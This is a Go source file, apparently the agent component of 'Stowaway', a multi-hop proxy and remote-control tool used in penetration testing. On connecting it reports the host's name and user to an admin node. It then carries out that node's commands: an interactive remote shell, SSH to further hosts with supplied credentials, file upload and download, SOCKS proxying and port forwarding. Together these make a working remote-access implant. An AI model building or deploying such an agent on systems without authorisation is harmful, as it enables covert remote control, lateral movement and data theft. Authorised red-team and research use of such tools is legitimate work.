/*
 * @Author: ph4ntom
 * @Date: 2021-03-10 15:27:30
 * @LastEditors: ph4ntom
 * @LastEditTime: 2021-04-03 13:47:15
 */

package process

import (
	"Stowaway/agent/handler"
	"Stowaway/agent/initial"
	"Stowaway/agent/manager"
	"Stowaway/protocol"
	"Stowaway/share"
	"Stowaway/utils"
	"log"
	"net"
	"os"
)

type Agent struct {
	UUID        string
	Conn        net.Conn
	Memo        string
	UserOptions *initial.Options

	BufferChan chan *BufferData
}

type BufferData struct {
	fHeader  *protocol.Header
	fMessage interface{}
}

func NewAgent(options *initial.Options) *Agent {
	agent := new(Agent)
	agent.UUID = protocol.TEMP_UUID
	agent.UserOptions = options
	agent.BufferChan = make(chan *BufferData, 10)
	return agent
}

func (agent *Agent) Run() {
	// send agent info first
	agent.sendMyInfo()
	// run manager
	mgr := manager.NewManager(share.NewFile())
	go mgr.Run()
	// run dispatcher expect tcp,cuz tcp dispatcher can not be confirmed because of the username/password changing
	go handler.DispathUDPData(mgr)
	go handler.DispathUDPReady(mgr)
	// process data from upstream
	go agent.handleConnFromUpstream(mgr)
	agent.handleDataFromUpstream(mgr)
	//agent.handleDataFromDownstream()
}

func (agent *Agent) sendMyInfo() {
	sMessage := protocol.PrepareAndDecideWhichSProtoToUpper(agent.Conn, agent.UserOptions.Secret, agent.UUID)
	header := &protocol.Header{
		Sender:      agent.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.MYINFO,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	hostname, username := utils.GetSystemInfo()

	myInfoMess := &protocol.MyInfo{
		UsernameLen: uint64(len(username)),
		Username:    username,
		HostnameLen: uint64(len(hostname)),
		Hostname:    hostname,
	}

	protocol.ConstructMessage(sMessage, header, myInfoMess)
	sMessage.SendMessage()
}

func (agent *Agent) handleConnFromUpstream(mgr *manager.Manager) {
	rMessage := protocol.PrepareAndDecideWhichRProtoFromUpper(agent.Conn, agent.UserOptions.Secret, agent.UUID)
	for {
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)
		if err != nil {
			log.Println("[*]Peer node seems offline!")
			os.Exit(0)
		}
		agent.BufferChan <- &BufferData{fHeader: fHeader, fMessage: fMessage}
	}
}

func (agent *Agent) handleDataFromUpstream(mgr *manager.Manager) {
	//sMessage := protocol.PrepareAndDecideWhichSProtoToUpper(agent.Conn, agent.UserOptions.Secret, agent.ID)
	component := &protocol.MessageComponent{
		Secret: agent.UserOptions.Secret,
		Conn:   agent.Conn,
		UUID:   agent.UUID,
	}

	shell := handler.NewShell()
	mySSH := handler.NewSSH()

	for {
		data := <-agent.BufferChan

		if data.fHeader.Accepter == agent.UUID {
			switch data.fHeader.MessageType {
			case protocol.MYMEMO:
				message := data.fMessage.(*protocol.MyMemo)
				agent.Memo = message.Memo
			case protocol.SHELLREQ:
				// No need to check member "start"
				go shell.Start(component)
			case protocol.SHELLCOMMAND:
				message := data.fMessage.(*protocol.ShellCommand)
				shell.Input(message.Command)
			case protocol.LISTENREQ:
				//message := fMessage.(*protocol.ListenReq)
				//go handler.StartListen(message.Addr)
			case protocol.SSHREQ:
				message := data.fMessage.(*protocol.SSHReq)
				mySSH.Addr = message.Addr
				mySSH.Method = int(message.Method)
				mySSH.Username = message.Username
				mySSH.Password = message.Password
				mySSH.Certificate = message.Certificate
				go mySSH.Start(component)
			case protocol.SSHCOMMAND:
				message := data.fMessage.(*protocol.SSHCommand)
				mySSH.Input(message.Command)
			case protocol.FILESTATREQ:
				message := data.fMessage.(*protocol.FileStatReq)
				mgr.File.FileName = message.Filename
				mgr.File.SliceNum = message.SliceNum
				err := mgr.File.CheckFileStat(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				if err == nil {
					go mgr.File.Receive(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				}
			case protocol.FILESTATRES:
				message := data.fMessage.(*protocol.FileStatRes)
				if message.OK == 1 {
					go mgr.File.Upload(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				} else {
					mgr.File.Handler.Close()
				}
			case protocol.FILEDATA:
				message := data.fMessage.(*protocol.FileData)
				mgr.File.DataChan <- message.Data
			case protocol.FILEERR:
				// No need to check message
				mgr.File.ErrChan <- true
			case protocol.FILEDOWNREQ:
				message := data.fMessage.(*protocol.FileDownReq)
				mgr.File.FilePath = message.FilePath
				mgr.File.FileName = message.Filename
				go mgr.File.SendFileStat(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
			case protocol.SOCKSSTART:
				message := data.fMessage.(*protocol.SocksStart)
				socks := handler.NewSocks(message.Username, message.Password)
				go socks.Start(mgr, component)
			case protocol.SOCKSTCPDATA:
				message := data.fMessage.(*protocol.SocksTCPData)
				mgr.SocksManager.SocksTCPDataChan <- message
			case protocol.SOCKSTCPFIN:
				message := data.fMessage.(*protocol.SocksTCPFin)
				mgr.SocksManager.SocksTCPDataChan <- message
			case protocol.UDPASSRES:
				message := data.fMessage.(*protocol.UDPAssRes)
				mgr.SocksManager.SocksUDPReadyChan <- message
			case protocol.SOCKSUDPDATA:
				message := data.fMessage.(*protocol.SocksUDPData)
				mgr.SocksManager.SocksUDPDataChan <- message
			case protocol.FORWARDSTART:
				message := data.fMessage.(*protocol.ForwardStart)
				go handler.TestForward(component, message.Addr)
			case protocol.OFFLINE:
				// No need to check message
				os.Exit(0)
			default:
				log.Println("[*]Unknown Message!")
			}
		}
	}
}
